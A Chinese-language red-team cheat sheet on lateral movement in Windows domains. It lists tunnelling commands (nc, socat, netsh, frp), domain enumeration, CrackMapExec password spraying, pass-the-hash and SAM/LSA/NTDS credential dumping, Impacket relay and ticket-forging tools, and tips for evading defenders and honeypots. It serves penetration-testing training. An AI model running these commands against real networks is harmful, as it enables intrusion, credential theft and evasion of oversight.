横向移动
================================

什么是内网横向攻击
--------------------------------
当通过外部打点进入到目标内网时，需要利用现有的资源尝试获取更多的凭证与权限，进而达到控制整个内网、拥有最高权限、发动 APT （高级持续性威胁攻击）等目地。
在攻防演练中，攻击方需要在有限的时间内近可能的获取更多的权限，因此必须具备高效的横向攻击思路。本次对内网横向攻击的技巧和方法进行总结。

注意事项
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 权限丢失
	webshell被发现，网站关站，木马后门被发现，主机改为不出网环境等。当遇到这些问题，需要做好应对措施，多方位的做好权限维持。
- 内网防火墙与杀毒软件
	内网防火墙，内网态势感知，内网流量监控，ids，ips等安全设备都会给横向攻击的开展造成很大的麻烦，应对措施有，对传输流量进行加密，修改cs流量特征，禁止大规模内网探测扫描等等。
- 内网蜜罐主机，蜜罐系统
	近年来攻防演练越来越多的防守方启用蜜罐主机，蜜罐系统，一旦蜜罐捕捉到攻击行为，并及时发现和处置，会导致权限丢失，前功尽弃。
- 运维管理人员
	内网横向攻击尽可能与运维管理人员的工作时间错开，尽量避免长时间登录administrator用户，如激活guest用户登录。降低被发现的几率。


windwos内网横穿
--------------------------------

常见端口
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 445
	- MS17-010，永恒之蓝
	- 远程本地认证：``net use \\192.168.1.2 /user:a\username password``
	- 其中a为域或工作组下的机器命名
+ 137/138/139
	- NetBios端口，137，138为UDP端口，用于内网传输文件
	- NetBios/SMB服务获取通过139端口
+ 135
	- 使用DCOM和RPC服务，用于WMI管理工具的远程操作
+ 53
	- DNS域传送漏洞
	- DNS协议隐秘传输
+ 389
	- LDAP
+ 88
	- Kerberos服务，监听KDC的票据请求，用户黄金票据和白银票据的伪造
+ 5985
	WinRM服务

端口转发
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ nc
	- 端口扫描
		+ 默认TCP：``nc -z -v -n 172.31.100.7 21-25``
	- 端口转发
		+ 将本地9000端口数据转发到192.168.100.2/8000：``mkfifo tmp/fifo|cat /tmp/fifo | nc 192.168.100.2 8000 | nc -l 9000 > /tmp/fifo`` 
		+ 访问：``nc -n 192.168.1.102 9000`` 
+ socat
	- 显示本地文件
		+ ``socat - /etc/sysctl.conf`` 
	- 监听本地端口
		+ ``socat TCP-LISTEN:12345 -`` 
	- UNIX DOMAIN域套接字转成TCP SOCKET
		+ ``socat TCP-LISTEN:12345,reuseaddr,fork UNIX-CONNECT:/data/deCOREIDPS/unix.domain`` 
	- 端口转发
		+ ``对于所有15000端口的TCP访问，一律转发到 server.wesnoth.org:15000 上`` 
		+ ``socat -d -d -lf /var/log/socat.log TCP4-LISTEN:15000,reuseaddr,fork,su=nobody TCP4:server.wesnoth.org:15000`` 
		+ ``tcp：nohup socat TCP4-LISTEN:2333,reuseaddr,fork TCP4:233.233.233.233:6666 >> /root/socat.log 2>&1 &`` 
		+ ``udp：nohup socat UDP4-LISTEN:2333,reuseaddr,fork UDP4:233.233.233.233:6666 >> /root/socat.log 2>&1 &`` 
+ netsh
	- 前提：IP Helper服务必须启动；管理员权限；
	- 查看已存在端口转发：``netsh interface portproxy show all``
	- 增加监听8888端口转发到3389端口：``netsh interface portproxy add v4tov4 listenport=8888 listenaddress=0.0.0.0 connectaddress=0.0.0.0 connectport=3389``
	- 删除转发端口：``netsh interface portproxy del v4tov4 listenport=8888 listenaddress=0.0.0.0``
	- 删除所有转发端口：``netsh interface portproxy reset``
+ portfwd
	- MSF自带工具
	- 将192.168.100.4的8888端口，映射到当前主机的8899端口
	- ``portfwd add -l 8899 -r 192.168.100.4 -p 8888``
+ proxychains
	- 修改配置/etc/proxychains.conf
		::
		
			[ProxyList]
			socks5 172.20.0.59 7222
	- 直接在程序前增加proxychains
	- ``sudo proxychains apt-get update``
	- 注意：socks代理不支持UDP协议，不支持icmp/ping协议，nmap使用受限。
+ frp
	- 官网下载：https://github.com/fatedier/frp/releases
	- 示例
		::
		
			跳板机（假设IP为172.20.0.59/192.168.100.3双网卡）上frps.ini配置：
			[common]
			bind_port = 7111
			
			执行命令：frps.exe -c frps.ini
			
			目标机器（假设IP为192.168.100.4/128.0.0.2双网卡）上frpc.ini配置：
			[common]
			server_addr = 192.168.100.3
			server_port = 7111

			[plugin_1]
			type = tcp
			remote_port = 7222
			plugin = socks5
			
			执行命令：frpc.exe -c frpc.ini
			
			这样再kali里面设置proxychains代理/etc/proxychains.conf：
			[ProxyList]
			socks5 172.20.0.59 7222
			在172.20.0.1/24网段机器使用nmap直接对内网128网段进行扫描：
			proxychains nmap -sT -Pn -p- 128.0.0.1/24
	- 相关问题
		+ frpc客户端连接会提示 login to server failed: EOF
			::
			
				修改frpc.ini文件，在common节点，添加tls_enable = true
+ NPS【综合】
	- 一款轻量级、高性能、功能强大的内网穿透代理服务器。支持tcp、udp、socks5、http等几乎所有流量转发。
	- 访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析、内网socks5代理等等，并带有功能强大的web管理端。
	- 项目地址：``https://github.com/ehang-io/nps``
	- 帮助文档：``https://ehang.io/nps/documents``
+ Goproxy 【综合】
	- Goproxy 是 golang 实现的高性能 http ,https ,websocket ,tcp ,socks5 代理服务器。
	- 项目地址：``https://github.com/snail007/goproxy``
	- 帮助文档：``https://snail007.host900.com/goproxy/manual/zh/#/``
+ Stowaway【多级】
	- Stowaway是一个利用go语言编写、专为渗透测试工作者制作的多级代理工具。
	- 项目地址：``https://github.com/ph4ntonn/Stowaway``
+ Neo-reGeorg【Webshell】
	- Neo-reGeorg 是一个旨在积极重构 reGeorg 的项目。
	- 项目地址：``https://github.com/L-codes/Neo-reGeorg``

域渗透
--------------------------------

域
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
域指将网络中多台计算机逻辑上组织到一起，进行集中管理的逻辑环境。域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器，域控制器中保存着整个域的用户帐号和安全数据库。

+ Active Directory
	- 活动目录（AD）是面向Windows Server的目录服务。Active Directory存储了有关网络对象的信息，并且让管理员和用户能够查找和使用这些信息。

+ NTLM认证
	- NTLM是NT LAN Manager的缩写，NTLM是基于挑战/应答的身份验证协议，是 Windows NT 早期版本中的标准安全协议，基本流程为：

	::
	
		客户端在本地加密当前用户的密码成为密码散列
		客户端向服务器明文发送账号
		服务器端产生一个16位的随机数字发送给客户端，作为一个challenge
		客户端用加密后的密码散列来加密challenge，然后返回给服务器，作为response
		服务器端将用户名、challenge、response发送给域控制器
		域控制器用这个用户名在SAM密码管理库中找到这个用户的密码散列，然后使用这个密码散列来加密chellenge
		域控制器比较两次加密的challenge，如果一样那么认证成功，反之认证失败

+ kerboser认证
	- 见认证机制章中Kerberos一节。

+ Pass The Hash
	- Pass The Hash (PtH) 是攻击者捕获帐号登录凭证后，复用凭证Hash进行攻击的方式。

+ Pass The Key

判断是否有域
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
一般域服务器都会同时作为时间服务器，所以使用下面命令判断主域
::

	1.存在域，但当前用户不是域用户，提示说明权限不够
		C:\Users>bypass>net time /domain
		发生系统错误 5 
		拒绝访问。

	2.存在域，并且当前用户是域用户
		C:\Users\Administrator>net time /domain
		\\dc.test.com 的当前时间是 2020/10/23 21:18:37
		
		命令成功完成。

	3.当前网络环境为工作组，不存在域
		C:\Users\Administrator>net time /domain
		找不到域 WORKGROUP 的域控制器。

找到域控主机IP
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
一般来说，域控服务器IP地址为DNS服务器地址，找到DNS服务器地址就可以定位域控。
::

	nslookup 域名
	ping 域名

查找域管理员
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::

	net user /domain //获取域用户列表
	net group /domain  //查询域内所有用户组列表
	net group “Domain Admins” /domain //查询域管理员用户
	net group "Domain Controllers" /domain  //查看域控制器
	net localgroup administrators /domain  //查询域内置本地管理员组用户

获取域用户hash
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ python3 GetNPUsers.py 'VULNNET-RST/' -usersfile user.txt -no-pass -dc-ip 10.10.33.36

相关工具
--------------------------------

CrackMapExec 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 地址：``https://github.com/byt3bl33d3r/CrackMapExec``
+ 安装
	::
	
		最方便：
		apt-get install crackmapexec
		避免有坑：
		apt-get install -y libssl-dev libffi-dev python-dev build-essential
		pip install --user pipenv
		git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
		cd CrackMapExec && pipenv install
		pipenv shell
		python setup.py install
+ 说明
	- 帮助：``crackmapexec --help``
	- 根据协议获取帮助信息：``crackmapexec smb --help``
	- 基本探测
		::
		
			crackmapexec protocol test.com
			crackmapexec protocol 192.168.3.70/24
			crackmapexec protocol 192.168.3.70-77  192.168.4.1-20
			crackmapexec protocol ~/ip.txt
	- 携带认证信息
		::
		
			crackmapexec protocol 192.168.3.70 -u administrator -p 'admin!@#45'
			crackmapexec protocol 192.168.3.70 -u='-administrator' -p='-admin!@#45'   //第一个字母为-的特殊情况语句
	- 协议探测：``crackmapexec  smb 192.168.3.73-76``
	- 密码喷射
		::
		
			crackmapexec smb 192.168.3.73-144 -u administrator -p 'admin!@#45'
			crackmapexec smb 192.168.3.73-144 -u administrator -p 'admin!@#45' 'Admin12345'
			crackmapexec smb 192.168.3.73-144 -u administrator  sqladmin -p 'admin!@#45' 'Admin12345'
			crackmapexec smb 192.168.3.73-144 -u ~/name.txt -p ~/pass.txt
			crackmapexec smb 192.168.3.73-144 -u ~/name.txt -H ~/ntlmhash.txt
			crackmapexec smb 192.168.3.73-144 -u user -H 'NTHASH'
			crackmapexec smb 192.168.3.73-144 -u user -H 'LMHASH:NTHASH'
	- 执行命令：``crackmapexec smb 192.168.3.144 -u administrator -p 'admin!@#45' -x whoami``
	- 凭证获取
		::
		
			crackmapexec smb 192.168.3.144 -u administrator -p 'admin!@#45' --sam
			crackmapexec smb 192.168.3.73-144 -u administrator -p 'admin!@#45' --lsa
			crackmapexec smb 192.168.3.73-144 -u administrator -p 'admin!@#45' --ntds
			crackmapexec smb 192.168.3.73-144 -u administrator -p 'admin!@#45' --ntds vss
			crackmapexec smb 192.168.3.73-144 -u administrator -p 'admin!@#45' --ntds-history
	- Sessions枚举：``crackmapexec smb 192.168.3.76-144 -u administrator -p 'admin!@#45' --sessions``
	- 共享枚举：``crackmapexec smb 192.168.3.76-144 -u administrator -p 'admin!@#45' --shares``
	- 磁盘枚举：``crackmapexec smb 192.168.3.76-144 -u administrator -p 'admin!@#45' --disk``
	- 登录用户枚举：``crackmapexec smb 192.168.3.76-144 -u administrator -p 'admin!@#45' --loggedon-users``
	- RID爆破枚举：``crackmapexec smb 192.168.3.76-144 -u administrator -p 'admin!@#45' --rid-brute``
	- 域用户枚举：``crackmapexec smb 192.168.3.76-144 -u administrator -p 'admin!@#45' --users``
	- 组枚举：``crackmapexec smb 192.168.3.76-144 -u administrator -p 'admin!@#45' --groups``
	- 本地组枚举：``crackmapexec smb 192.168.3.76-144 -u administrator -p 'admin!@#45' --local-groups``
	- 域密码策略枚举：``crackmapexec smb 192.168.3.76-144 -u administrator -p 'admin!@#45' --pass-pol``

Impackt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 安装
	- git clone https://github.com/CoreSecurity/impacket.git
	- cd impacket/
	- python setup.py install
+ 通用选项
	- 密码认证连接：``python3 xxx.py [域]/[用户]:[密码]@[目标ip]``
	- hash认证连接：``python3 xxx.py [域]/[用户]@ip -hashes :161cff084477fe596a5db81874498a24``
	- Kerberos认证：``export KRB5CCNAME=ad01.ccache ``,``python3 xxx.py -k -no-pass``
	- 指定目标IP：``-target-ip 192.168.40.156``
	- 指定域控IP：``-dc-ip 192.168.40.156``
+ psexec.py
	- 类似PSEXEC的功能示例，使用remcomsvc（https://github.com/kavika13/remcom）。
+ smbexec.py：
	- 与使用remcomsvc的psexec w/o类似的方法。这里描述了该技术。实例化本地smbserver以接收命令的输出。这在目标计算机没有可写共享可用的情况下很有用。
+ atexec.py
	- 通过Task Scheduler服务在目标计算机上执行命令，并返回已执行命令的输出。
+ wmiexec.py
	- 通过Windows Management Instrumentation使用的半交互式shell，它不需要在目标服务器上安装任何服务/代理，以管理员身份运行，非常隐蔽。
+ dcomexec.py
	- 类似于wmiexec.py的半交互式shell，但使用不同的DCOM端点。目前支持MMC20.Application，ShellWindows和ShellBrowserWindow对象。
+ GetTGT.py
	- 指定密码，哈希或aesKey，此脚本将请求TGT并将其保存为ccache。
+ GetST.py
	- 指定ccache中的密码，哈希，aesKey或TGT，此脚本将请求服务票证并将其保存为ccache。如果该帐户具有约束委派（具有协议转换）权限，您将能够使用-impersonate参数代表另一个用户请求该票证。
+ GetPac.py
	- 获得指定目标用户的PAC（权限属性证书）结构，该结构仅具有正常的经过身份验证的用户凭据。它通过混合使用[MS-SFU]的S4USelf +用户到用户Kerberos身份验证组合来实现的。
+ GetUserSPNs.py
	- 查找和获取与普通用户帐户关联的服务主体名称。
+ GetNPUsers.py
	- 尝试为那些设置了属性“不需要Kerberos预身份验证”的用户获取TGT（UF_DONT_REQUIRE_PREAUTH)。
+ ticketer.py
	- 从头开始或基于模板（根据KDC的合法请求）创建金/银票据，允许您在PAC_LOGON_INFO结构中自定义设置的一些参数，特别是组、外接程序、持续时间等。
+ raiseChild.py
	- 通过（ab）使用Golden Tickets和ExtraSids的基础来实现子域到林权限的升级。
+ secretsdump.py
	- 执行各种技术从远程机器转储Secrets，而不在那里执行任何代理。对于SAM和LSA Secrets（包括缓存的凭据），然后将hives保存在目标系统（％SYSTEMROOT％\ Temp目录）中，并从中读取其余数据。对于DIT文件，我们使用dl_drsgetncchanges()方法转储NTLM哈希值、纯文本凭据（如果可用）和Kerberos密钥。
+ mimikatz.py
	- 远程mimikatz RPC服务器的迷你shell。
+ ntlmrelayx.py
	- 此脚本执行NTLM中继攻击，设置SMB和HTTP服务器并将凭据中继到许多不同的协议。
+ karmaSMB.py
	- 无论指定的SMB共享和路径名如何，都会响应特定文件内容的SMB服务器。
+ smbserver.py
	- SMB服务器的Python实现，允许快速设置共享和用户帐户。
+ smbclient.py
	- 通用的SMB客户端。
+ wmiquery.py
	- 它允许发出WQL查询并在目标系统上获取WMI对象的描述（例如，从win32_account中选择名称）
+ wmipersist.py
	- 此脚本创建/删除wmi事件使用者/筛选器，并在两者之间建立链接，以基于指定的wql筛选器或计时器执行Visual Basic Basic。
+ lookupsid.py
	- 安全标识符（SID）是可变长度的唯一值，用于标识用户帐户，通过[MS-LSAT] MSRPC接口的Windows SID暴力破解查找远程用户和组。
+ reg.py
	- 通过[ms-rrp]msrpc接口远程注册表操作工具。
+ rpcdump.py
	- 转储目标上注册的RPC端点和字符串绑定列表,它还将尝试将它们与已知端点列表进行匹配。
+ opdump.py
	- 这将绑定到给定的hostname:port和msrpc接口。然后，它尝试依次调用前256个操作号中的每一个，并报告每个调用的结果。
+ samrdump.py
	- 从MSRPC套件与安全帐户管理器远程接口通信的应用程序中。它列出了通过此服务导出的系统用户帐户、可用资源共享和其他敏感信息。
+ services.py
	- 此脚本可用于通过[MS-SCMR] MSRPC接口操作Windows服务。它支持启动，停止，删除，状态，配置，列表，创建和更改。
+ ifmap.py
	- 此脚本将绑定到目标的管理接口，以获取接口ID列表。它将在另一个界面UUID列表上使用这个列表，尝试绑定到每个接口并报告接口是否已列出或正在侦听。
+ getArch.py
	- 此脚本将与目标（或目标列表）主机连接，并使用文档化的msrpc功能收集由（ab）安装的操作系统体系结构类型。
+ netview.py
	- 获取在远程主机上打开的会话列表，并跟踪这些会话在找到的主机上循环，并跟踪从远程服务器登录/退出的用户。
+ goldenPac.py
	- 利用MS14-068。保存Golden Ticket并在目标位置启动PSExec会话。
+ sambaPipe.py
	- 该脚本将利用CVE-2017-7494，通过-so参数上传和执行用户指定的共享库。
+ smbrelayx.py
	- 利用SMB中继攻击漏洞CVE-2015-0005。如果目标系统正在执行签名并且提供了计算机帐户，则模块将尝试通过NETLOGON收集SMB会话密钥。
+ mssqlinstance.py
	- 从目标主机中检索MSSQL实例名称。
+ mssqlclient.py
	- MSSQL客户端,支持SQL和Windows身份验证（哈希）.它还支持TLS。
+ esentutl.py
	- Extensibe存储引擎格式实现。它允许转储ESE数据库的目录，页面和表（例如NTDS.dit）
+ ntfs-read.py
	- NTFS格式实现。此脚本提供了一个用于浏览和提取NTFS卷的功能小的反弹shell，包括隐藏/锁定的内容
+ registry-read.py
	- Windwows注册表文件格式实现。它允许解析脱机注册表配置单元.
+ GetADUsers.py
	- 此脚本将收集有关域用户及其相应电子邮件地址的数据。它还将包括有关上次登录和上次密码设置属性的一些额外信息。
+ mqtt_check.py
	- 简单的MQTT示例，旨在使用不同的登录选项。可以很容易地转换成帐户/密码暴力工具。
+ rdp_check.py
	- [MS-RDPBCGR ]和[MS-CREDSSP]部分实现只是为了达到CredSSP身份验证。此示例测试帐户在目标主机上是否有效。
+ sniff.py
	- 简单的数据包嗅探器，使用pcapy库来监听在指定接口上传输的包。
+ sniffer.py
	- 简单的数据包嗅探器，它使用原始套接字来侦听与指定协议相对应的传输中的数据包。
+ ping.py
	- 简单的ICMP ping。
+ ping6.py
	- 简单的IPv6 ICMP ping，它使用ICMP echo和echo-reply数据包来检查主机的状态。
